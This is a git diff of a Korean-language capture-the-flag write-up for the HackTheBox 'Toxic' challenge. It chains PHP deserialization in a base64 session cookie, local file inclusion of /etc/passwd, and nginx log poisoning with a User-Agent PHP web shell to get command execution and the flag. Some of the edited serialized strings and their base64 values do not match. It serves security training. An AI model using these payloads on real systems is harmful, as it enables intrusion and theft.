@@ -1,9 +1,10 @@
 
-# TryHackMe Walkthrough - Room: Toxic
+# HackTheBox Walkthrough - Room: Toxic
 
 **Target IP**: 94.237.57.115:39582  
 **Difficulty**: Medium  
-**Objective**: Gain access to the system by exploiting insecure object deserialization and log poisoning, and retrieve the flag.
+**Objective**: Gain access to the system by exploiting insecure object deserialization and log poisoning, and retrieve the flag.  
+![webpage](img/webpage.png)
 
 ---
 
@@ -13,7 +14,9 @@
 
 - 브라우저로 `http://94.237.57.115:39582` 접속.
 - 페이지는 간단한 텍스트와 함께 PHP로 구성된 것으로 보임.
-- BurpSuite로 요청을 가로채고, 쿠키 값을 확인해보면 다음과 같은 `session` 쿠키가 존재함:
+- BurpSuite로 요청을 가로채고, 쿠키 값을 확인해보면 다음과 같은 `session` 쿠키가 존재함:  
+![indexphp](img/indexphp.png)  
+![burpsuit](img/burpsuit.png)
 
 ```
 Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9
@@ -22,7 +25,8 @@ Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9
 ### 🔍 Step 2: 쿠키 디코딩 및 분석
 
 - 해당 값은 base64로 인코딩된 직렬화된 PHP 객체임.
-- 디코딩:
+- 디코딩:  
+![decode](img/decode.png)
 
 ```php
 O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
@@ -41,20 +45,20 @@ O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
 ### ✅ 정상 출력 (기존 쿠키):
 
 ```php
-O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
+O:9:"PageModel":1:{s:4:"file";s:15:"/etc/passwd";}
 ```
+![passwd](img/passwd.png)
 
-→ base64: `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9`
+→ base64: `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30=`
 
 ### ❌ 실패한 flag 시도:
 
 ```php
 O:9:"PageModel":1:{s:4:"file";s:9:"/var/flag";}
 ```
+![burp2](img/burp2.png)
 
-→ base64: `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czo5OiIvdmFyL2ZsYWciO30=`
-
-요청 후 500 Internal Error 발생 → 접근 권한 문제 혹은 파일 없음
+→ base64: `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czo0OiJmbGFnIjt9`
 
 ---
 
@@ -93,6 +97,7 @@ User-Agent: <?php system($_GET['cmd']); ?>
 GET /?cmd=ls HTTP/1.1
 Cookie: session=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
 ```
+![rce](img/rce.png)
 
 → 결과:
 
@@ -109,7 +114,8 @@ static
 GET /?cmd=ls ./../ HTTP/1.1
 ```
 
-→ 결과:
+→ 결과:  
+![findflag](img/findflag.png)
 
 ```
 flag_B6HLk
@@ -121,7 +127,8 @@ flag_B6HLk
 GET /?cmd=cat ./../flag_B6HLk HTTP/1.1
 ```
 
-→ 결과:
+→ 결과:  
+![flag](img/flag.png)
 
 ```
 HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}
@@ -147,5 +154,3 @@ HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}
 
 - **플래그**: `HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}`
 - **획득 방법**: Nginx Access Log를 통한 로그 포이즈닝 + LFI + PHP RCE
-
----
